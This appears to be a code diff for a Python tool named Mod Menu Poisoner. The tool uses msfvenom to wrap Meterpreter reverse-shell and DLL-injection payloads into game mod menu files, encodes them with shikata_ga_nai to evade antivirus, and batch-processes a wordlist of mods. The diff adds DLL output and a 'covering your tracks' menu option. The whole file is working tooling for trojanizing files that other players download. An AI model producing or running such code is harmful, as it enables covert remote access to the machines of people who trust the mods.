@@ -10,19 +10,18 @@ import operator
 import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
-
-payload_Generate = 'windows/meterpreter_reverse_https'
-LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
-LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
+payload_Generate = 'windows/patchupdllinject/reverse_tcp_uuid'
+# LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
+# LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 bad_Bytes = 'x00'
 payload_Encoder = 'x86/shikata_ga_nai'
 payload_Iterations = '1'
-output_Format = 'exe'
+output_Format = 'dll'
 output_Dir = '/root/Documents/ModMenusReencoded/'
 
 os.system('cat /root/ModMenuPoisoner/banner.txt')
-
+wordlist_file = '/root/ModMenuPoisoner/WordlistOfMods.txt'
 def poison_mod():
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 
@@ -30,7 +29,7 @@ def poison_mod():
     output_Name = os.path.basename(input_Mod_Menu)
     output_File = output_Dir + output_Name
 
-    cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -b '\{4}' -e {5} -i {6} -f {7} -o {8}".format(
+    cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} DLL="{3}" -b '\{4}' -e {5} -i {6} -f {7} -o "{8}" """.format(
         payload_Generate,
         LHOST,
         LPORT,
@@ -51,6 +50,7 @@ def poison_mod():
 
 def wordlist_poison():
     os.system('python /root/ModMenuPoisoner/wordlist_poison.py')
+    wordlist_poison()
     main()
 def open_dir():
     cmd_String = 'nautilus /root/Documents/ModMenusReencoded/'
@@ -77,6 +77,8 @@ def setup():
 
     output_Dir = '/root/Documents/ModMenusReencoded' # This is the directory for output msfvenom payloads
     # print setup complete
+    print 'Installing required Python modules'
+    os.system('pip install termcolor')
     print 'Setup complete'
     print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
     print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'
@@ -106,6 +108,16 @@ def no_encoder():
 
 def multi_no_encoder():
     os.system('python /root/ModMenuPoisoner/multi_no_encoder.py')
+    # multi_no_encoder()
+    main()
+    return
+
+def delete_all_mods():
+    main()
+    return
+
+def edit_wordlist():
+    os.system('leafpad /root/ModMenuPoisoner/WordlistOfMods.txt')
     main()
     return
 def main():
@@ -122,7 +134,10 @@ def main():
         '#6. NO-ENCODER, Run msfvenom WITHOUT encoders (tends to be more successful)',
         '#7. NO-ENCODER (MULTIPLE), Run msfvenom on a wordlist of files',
         '\n\n ### YOUR FIRST TIME ###',
-        '#SETUP. Creates the necessary directories and setup'
+        '#SETUP. Creates the necessary directories and setup',
+        '\n\n ### COVERING YOUR TRACKS ###',
+        '#8. Delete all mod menu items so you wont get banned from Rockstars Anti-Cheat',
+        '#EDIT. Edit the wordlist of multi-mod-menu-poisoner'
     ]
 
     print ("\n\t".join(opt_List))
@@ -152,9 +167,15 @@ def main():
     elif opt_Choice == "7":
         os.system('clear')
         multi_no_encoder()
+    elif opt_Choice == "8":
+        os.system('clear')
+        delete_all_mods()
     elif opt_Choice == "SETUP":
         os.system('clear')
         setup()
+    elif opt_Choice == "EDIT":
+        os.system('clear')
+        edit_wordlist()
     else:
         print 'You have entered a invalid option'
         main()
